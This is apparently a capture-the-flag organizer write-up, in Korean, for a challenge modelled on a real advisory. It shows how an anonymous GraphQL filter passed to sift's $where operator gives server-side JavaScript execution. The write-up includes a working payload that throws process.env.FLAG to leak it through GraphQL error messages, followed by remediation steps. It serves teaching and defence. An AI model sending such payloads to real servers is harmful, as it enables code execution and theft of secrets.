# Organizer Write-up

## 난이도와 목표

소스 비공개 블랙박스 기준 예상 풀이 시간은 45~100분입니다. GraphQL schema/source map 탐색, resolver가 기대하는 중첩 filter 형태, Mongo-style operator, 예외 반영 exfiltration을 연결해야 합니다.

## 1. Client artifact에서 schema와 변수 형태 확인

`/assets/explorer.js` 끝의 `sourceMappingURL`을 따라가면 다음 사실을 얻습니다.

- 공개 endpoint는 `/graphql`
- schema는 `/assets/schema.graphql`
- 화면의 JSON은 `variables.filter.tasks` 아래에 들어감
- 익명 role에 `queue:read`가 있음

Schema는 `taskGroups(filter: JSON)`을 노출합니다. `JSON`은 open scalar라 내부 operator key가 GraphQL type validation 대상이 아닙니다.

## 2. 정상 query 확인

```json
{
  "query": "query TaskGroupSearch($filter: JSON) { taskGroups(filter: $filter) { edges { node { taskGroupId name state } } } }",
  "variables": {
    "filter": {
      "tasks": {
        "state": { "$eq": "running" }
      }
    }
  }
}
```

최상위 `filter.$where`는 resolver shape와 맞지 않아 실행되지 않습니다. GraphQL query 문자열에 JavaScript를 넣는 것도 주석/문법일 뿐 filter evaluator에 전달되지 않습니다.

## 3. `$where` 실행과 error-channel exfiltration

취약 evaluator는 `filter.tasks`를 sift-style matcher에 넘기고 `$where` 문자열을 다음과 동등한 방식으로 컴파일합니다.

```js
new Function('obj', `"use strict"; return (${where});`)
```

GraphQL error formatter가 예외 message를 응답에 포함하므로 flag를 예외로 던집니다.

```json
{
  "query": "query TaskGroupSearch($filter: JSON) { taskGroups(filter: $filter) { edges { node { taskGroupId name state } } } }",
  "variables": {
    "filter": {
      "tasks": {
        "$where": "(()=>{throw new Error(process.env.FLAG)})()"
      }
    }
  }
}
```

응답의 `errors[0].message`에서 flag를 얻습니다. 출제자 기준 구현은 `node solver/solve.mjs`입니다.

## 실제 공개 사례와의 대응

- 공식 GHSA가 설명하는 공통 root cause: 익명 접근 가능한 GraphQL resolver의 open `JSON` filter가 검증 없이 sift 17.1.3에 전달되고, `$where`가 `new Function`으로 실행되며, error formatter가 예외를 반영했습니다.
- 교육용 변경: resolver/data/schema 이름, UI, `filter.tasks` 중첩, worker timeout은 CTF 안정성과 난이도를 위한 가상 구성입니다.
- 실제 Taskcluster 코드를 포함하지 않으며 vendor 제품의 1:1 exploit 재현이라고 주장하면 안 됩니다.

## 수정 원칙

1. 취약 sift filter 기능을 제거하고 필요한 query field/operator만 schema로 명시합니다.
2. open JSON을 받더라도 `$` prefix key를 재귀적으로 거부하고 prototype이 없는 정규화 객체로 변환합니다.
3. `new Function`/`eval` 기반 operator를 사용하지 않습니다.
4. 익명 role의 scope를 최소화하고 GraphQL error는 내부 예외 message를 외부에 반영하지 않습니다.
5. 패치 뒤 web-server가 접근할 수 있었던 credential을 회전합니다.
